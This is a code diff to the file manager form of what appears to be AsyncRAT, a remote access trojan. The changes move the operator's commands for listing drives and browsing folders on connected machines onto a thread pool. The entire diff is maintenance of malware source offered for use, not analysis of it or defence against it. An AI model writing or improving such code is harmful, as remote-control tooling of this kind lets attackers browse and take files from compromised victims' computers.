@@ -27,7 +27,7 @@ namespace AsyncRAT_Sharp.Forms
                     msgpack.ForcePathObject("Packet").AsString = "fileManager";
                     msgpack.ForcePathObject("Command").AsString = "getPath";
                     msgpack.ForcePathObject("Path").AsString = listView1.SelectedItems[0].ToolTipText;
-                    C.BeginSend(msgpack.Encode2Bytes());
+                    ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
                     toolStripStatusLabel1.Text = listView1.SelectedItems[0].ToolTipText;
                 }
             }
@@ -47,7 +47,7 @@ namespace AsyncRAT_Sharp.Forms
                 {
                     msgpack.ForcePathObject("Packet").AsString = "fileManager";
                     msgpack.ForcePathObject("Command").AsString = "getDrivers";
-                    C.BeginSend(msgpack.Encode2Bytes());
+                    ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
                     return;
                 }
                 path = path.Remove(path.LastIndexOfAny(new char[] { '\\' }, path.LastIndexOf('\\')));
@@ -62,7 +62,7 @@ namespace AsyncRAT_Sharp.Forms
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "fileManager";
                 msgpack.ForcePathObject("Command").AsString = "getDrivers";
-                C.BeginSend(msgpack.Encode2Bytes());
+                ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
                 return;
             }
 
@@ -151,7 +151,7 @@ namespace AsyncRAT_Sharp.Forms
                 msgpack.ForcePathObject("Packet").AsString = "fileManager";
                 msgpack.ForcePathObject("Command").AsString = "getPath";
                 msgpack.ForcePathObject("Path").AsString = toolStripStatusLabel1.Text;
-                C.BeginSend(msgpack.Encode2Bytes());
+                ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
             }
             catch
             {
